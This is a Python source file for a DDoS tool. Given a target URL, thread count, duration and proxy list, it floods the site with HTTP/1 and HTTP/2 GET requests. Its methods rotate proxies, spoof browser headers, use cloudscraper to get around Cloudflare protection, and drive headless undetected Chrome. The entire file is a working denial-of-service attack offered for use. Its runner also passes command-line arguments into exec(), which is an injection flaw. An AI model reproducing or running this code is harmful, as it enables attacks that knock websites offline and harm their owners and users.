import httpx, threading, cloudscraper, requests
from concurrent.futures import ThreadPoolExecutor
import undetected_chromedriver as uc
from selenium import webdriver
from fake_useragent import UserAgent
import random, datetime, time
import argparse

class Method:
    class PXHTTP2:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXHTTP2, args=(until, headers)).start()
        def AttackPXHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.proxies = random.choice(open(self.proxy, 'r').readlines())
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+self.proxies,
                            'https://': 'http://'+self.proxies,
                        }
                    )
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class HTTP2:
        def __init__(self, url, thread, time):
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackHTTP2, args=(until, headers)).start()
        def AttackHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.launcher = httpx.Client(http2=True)
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXCFB:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper()
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXCFB, args=(until)).start()
        def AttackPXCFB(self, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    self.scraper.get(self.url, proxies=proxy)
                    self.scraper.get(self.url, proxies=proxy)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXREQ:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXREQ, args=(until)).start()
        def AttackPXREQ(self, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    requests.get(self.url, proxies=proxy)
                    requests.get(self.url, proxies=proxy)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXBYP:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper()
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackBYP, args=(until, headers)).start()
        def AttackBYP(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    requests.get(self.url, proxies=proxy, verify=False)
                    self.scraper.get(self.url, proxies=proxy, verify=False)
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }
                    )
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXROCKET:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXROCKET, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXROCKET(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    options = webdriver.ChromeOptions()
                    options.add_argument(f"--proxy-server={random.choice(open(self.proxy, 'r').readlines())}")  # Tambahkan proxy
                    options.headless = True
                    driver = uc.Chrome(options=options)
                    driver.get(url)
                except:
                    pass

        def start(self):
            return self.Attack()

class Runner:
    def __init__(self, args):
        self.args = args
    def start():
        with ThreadPoolExecutor(max_workers=150) as executor:
            exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}, "{args.proxy}").start())') if 'PX' in str(args.method).upper() else exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}).start())')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f'Usage: python3 {__file__} [OPTIONS]')
    parser.add_argument('-u', '--url', type=str, help='Target URL', required=True, metavar='')
    parser.add_argument('-th', '--thread', type=str, help='Threader', required=True, metavar='')
    parser.add_argument('-t', '--time',type=str, help='DDoS Duration', required=True, metavar='')
    parser.add_argument('-p', '--proxy', type=str, help='Proxy addrress', metavar='')
    parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET')
    args = parser.parse_args()
    threading.Thread(target=Runner.start()).start()
